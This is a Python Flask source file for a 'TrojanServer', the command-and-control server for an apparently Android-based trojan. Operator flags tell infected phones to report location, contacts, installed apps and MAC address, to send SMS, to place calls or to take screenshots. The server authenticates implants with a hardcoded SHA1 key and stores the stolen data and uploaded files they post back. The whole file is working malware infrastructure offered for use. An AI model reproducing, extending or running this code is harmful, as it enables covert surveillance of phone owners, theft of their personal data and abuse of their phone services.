from flask import Flask, request, Response
import argparse
import socket
import os
import json
import hashlib
import logging
from os.path import expanduser

KEY = 'LOL' + '8df639b301a1e10c36cc2f03bbdf8863'



class ParseArgs:
    def __init__(self):
        self.parser = argparse.ArgumentParser(description='ACTION')
        self.parser.add_argument('--location', dest='location', action='store_true', default=False,
                                 help='Obtiene la localizacion')
        self.parser.add_argument('--contacts', dest='contacts', action='store_true', default=False,
                                 help='Obtiene los contactos')
        self.parser.add_argument('--packages', dest='packages', action='store_true', default=False,
                                 help='Obtiene las apps instaladas')
        self.parser.add_argument('--mac', dest='mac', action='store_true', default=False,
                                 help='Obitene mac')
        self.parser.add_argument('--sendsms', dest='sendsms', action='store', metavar=('PhoneNumber', 'Message'),
                                 nargs=2, default=False,
                                 help='Envia SMS')
        self.parser.add_argument('--call', dest='call', action='store', metavar=('PhoneNumber', 'calltime'), nargs=2,
                                 default=False,
                                 help='Llama a un numero X milisegundos')
        self.parser.add_argument('-v', '--verbose', dest='verbose', action='store_true', default=False,
                                 help='verbose')
        self.parser.add_argument('-s', '--ssl', dest='ssl', action='store', metavar=('folder'), nargs=1,
                                 default=False,
                                 help='Folder with app.crt and app.key for https')
	self.parser.add_argument('--screenshot', dest='screenshot',action='store_true',default=False,help='Toma captura de pantalla')
	self.args = self.parser.parse_args()

    def getargs(self):
        return self.args


class TrojanServer():
    def __init__(self, app, host, port, args, ssl=False):
        self.app = app
        self.host = host
        self.port = port
        self.args = args
        self.ssl = ssl
        self.null = 'null'
        self.excludeArgs = ['verbose', 'ssl']
        self.nullAction = False
        self.route()

    def route(self):
        self.app.add_url_rule('/', view_func=self.default, methods=['GET', ])
        self.app.add_url_rule('/action', view_func=self.action, methods=['GET', ])
        self.app.add_url_rule('/result', view_func=self.result, methods=['POST', ])

    def start(self):
        if not self.args.verbose:
            logging.getLogger('werkzeug').setLevel(logging.ERROR)

        if not self.ssl:
            self.app.run(host=self.host, port=self.port, debug=self.args.verbose)
        else:
            self.app.run(host=self.host, port=self.port, ssl_context=self.ssl, debug=self.args.verbose)


    def default(self):
        return 'hello'

    def action(self):
        sha1 = hashlib.sha1()
        sha1.update(KEY)

        try:
            SHA = request.headers.get('Authorization').split('::::')[1]
            MAC = request.headers.get('Authorization').split('::::')[0]
            IP = request.remote_addr
            if SHA != sha1.hexdigest():
                return Response(self.null, status=401)
        except Exception:
            return Response(self.null, status=401)


        for arg, value in sorted(vars(self.args).items()):
            if value and not self.nullAction and arg not in self.excludeArgs:
                return Response(json.dumps({arg: value}), status=200, mimetype='application/json')
        return self.null

    def result(self):
        sha1 = hashlib.sha1()
        sha1.update(KEY)
        
        SHA = request.headers.get('Authorization').split('::::')[1]
        MAC = request.headers.get('Authorization').split('::::')[0]
        IP = request.remote_addr

        if SHA == sha1.hexdigest():
            print(IP + " " + MAC)
            if request.mimetype == "application/json":
                try:
                    resultjson = json.dumps(request.get_json(), indent=3, sort_keys=True, encoding="utf-8")
                    print(resultjson)
                except Exception:
                    print(str(request.data))
            elif request.mimetype == "multipart/form-data":
                fileresult = expanduser("~") + "/result"
                print(fileresult)
                request.files['filedata'].save(fileresult)
            else:
                print(str(request.data))

            self.nullAction = True
            self.stop()
            return Response(self.null, status=200)
        else:
            print(request.remote_addr + "Wrong KEY")
            return Response(self.null, status=401)

    @staticmethod
    def stop():
        func = request.environ.get('werkzeug.server.shutdown')
        if func is None:
            raise RuntimeError('Not running with the Werkzeug Server')
        func()


def get_ip_address():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    return s.getsockname()[0]

def main():
    args = ParseArgs().getargs()
    if args.ssl and os.path.isfile(args.ssl[0] + '/app.crt') and os.path.isfile(args.ssl[0] + '/app.key'):
        ssl = (args.ssl[0] + '/app.crt', args.ssl[0] + '/app.key')
    else:
        ssl = False

    app = Flask(__name__)
    server = TrojanServer(app=app, host=get_ip_address(), port=443, args=args, ssl=ssl)
    server.start()

if __name__ == '__main__':
    main()
